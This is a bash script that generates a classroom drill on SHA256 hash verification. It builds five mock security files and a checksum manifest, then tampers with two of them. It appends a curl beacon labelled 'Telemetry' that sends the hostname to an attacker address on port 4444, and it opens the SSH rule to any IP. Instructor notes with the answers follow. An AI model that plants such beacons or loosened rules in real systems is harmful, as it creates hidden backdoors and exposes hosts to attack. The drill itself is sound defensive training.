#!/usr/bin/env bash
# generate.sh — Regenerate all challenge files for drill-02-hash-verification
#
# Creates 5 "software files" and publishes a SHA256SUMS manifest,
# then silently tampers with 2 of the files (replicating the drill scenario).
#
# Usage: bash generate.sh
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

echo "=== Generating challenge files for drill-02-hash-verification ==="

# ── 1. Create the original (untampered) software files ───────────────────────
cat > soc_agent_v2.3.sh << 'EOF'
#!/bin/bash
# SOC Monitoring Agent v2.3
# Build: 20240115-a7f3c1
echo "Starting SOC agent..."
systemctl start soc-monitor
echo "SOC agent running on port 9090"
EOF

cat > threat_intel_updater.py << 'EOF'
#!/usr/bin/env python3
# Threat Intelligence Updater v1.2
# Hash: checksum verified
import requests, json, logging
logging.basicConfig(level=logging.INFO)

def update_iocs():
    url = 'https://ioc-feed.internal.corp/latest'
    response = requests.get(url, timeout=10)
    iocs = response.json()
    logging.info(f"Updated {len(iocs)} IOCs")
    return iocs

if __name__ == '__main__':
    update_iocs()
EOF

cat > firewall_rules.conf << 'EOF'
# Firewall Rules v4.1 - DO NOT MODIFY WITHOUT CHANGE TICKET
# Last reviewed: 2024-01-10

-A INPUT -p tcp --dport 22 -s 10.0.0.0/8 -j ACCEPT
-A INPUT -p tcp --dport 443 -j ACCEPT
-A INPUT -p tcp --dport 80 -j REDIRECT --to-port 443
-A INPUT -j DROP
EOF

cat > ids_config.yaml << 'EOF'
# IDS Configuration v2.0
version: "2.0"
rules_path: /etc/ids/rules/
log_path: /var/log/ids/
alert_threshold: HIGH
notify_email: soc@corp.local
tuning:
  suppress_noise: true
  max_packet_size: 65535
EOF

cat > certificate_bundle.pem << 'EOF'
-----BEGIN CERTIFICATE-----
MIICpDCCAYwCCQDU+pQ4pHgSpDANBgkqhkiG9w0BAQsFADAUMRIwEAYDVQQDDAls
b2NhbGhvc3QwHhcNMjQwMTAxMDAwMDAwWhcNMjUwMTAxMDAwMDAwWjAUMRIwEAYD
VQQDDAlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC7
-----END CERTIFICATE-----
EOF

echo "[+] 5 original software files created"

# ── 2. Generate the vendor-published SHA256SUMS manifest (BEFORE tampering) ──
sha256sum \
  soc_agent_v2.3.sh \
  threat_intel_updater.py \
  firewall_rules.conf \
  ids_config.yaml \
  certificate_bundle.pem > SHA256SUMS.published
echo "[+] SHA256SUMS.published created (vendor-published hashes)"

# ── 3. Tamper with 2 files (this happens silently — students must find it) ───
# Tamper 1: Supply-chain backdoor injected into the monitoring agent
cat >> soc_agent_v2.3.sh << 'EOF'

# Telemetry
curl -s http://192.168.43.17:4444/beacon?host=$(hostname) &
EOF

# Tamper 2: SSH firewall rule modified to allow connections from any IP
sed -i 's/-s 10\.0\.0\.0\/8 //' firewall_rules.conf

echo "[+] 2 files tampered (students must identify which ones and what changed)"

# ── 4. Instructor reference: what changed ────────────────────────────────────
cat > INSTRUCTOR_NOTES.txt << 'NOTES'
# INSTRUCTOR NOTES — drill-02-hash-verification
# DO NOT distribute to students

TAMPERED FILES:
  1. soc_agent_v2.3.sh
     Change: Backdoor appended — curl beacon to attacker C2 server
     Risk:   Every host running this agent beacons out to 192.168.43.17:4444
             Attacker gains persistent access + knowledge of all hostnames
     Impact: Critical — active C2 channel established

  2. firewall_rules.conf
     Change: Removed "-s 10.0.0.0/8" from the SSH INPUT rule
     Before: -A INPUT -p tcp --dport 22 -s 10.0.0.0/8 -j ACCEPT
     After:  -A INPUT -p tcp --dport 22 -j ACCEPT
     Risk:   SSH is now reachable from ANY IP address (including internet)
     Impact: High — brute force / credential stuffing attacks from internet

EXPECTED VERIFICATION OUTPUT:
  sha256sum --check SHA256SUMS.published
  soc_agent_v2.3.sh: FAILED
  threat_intel_updater.py: OK
  firewall_rules.conf: FAILED
  ids_config.yaml: OK
  certificate_bundle.pem: OK
  sha256sum: WARNING: 2 computed checksums did NOT match

STUDENT PASS CRITERIA:
  - Identify both tampered files
  - Describe the change in soc_agent_v2.3.sh (C2 backdoor)
  - Describe the change in firewall_rules.conf (SSH open to internet)
  - Provide risk assessment for each
NOTES

echo "[+] INSTRUCTOR_NOTES.txt created"

echo ""
echo "=== Generation complete ==="
echo ""
echo "Files created:"
ls -lh "$SCRIPT_DIR"
echo ""
echo "Distribute to students (without INSTRUCTOR_NOTES.txt):"
echo "  soc_agent_v2.3.sh, threat_intel_updater.py, firewall_rules.conf,"
echo "  ids_config.yaml, certificate_bundle.pem, SHA256SUMS.published"
echo ""
echo "Students run: sha256sum --check SHA256SUMS.published"
echo "Expected: 2 FAILED files"
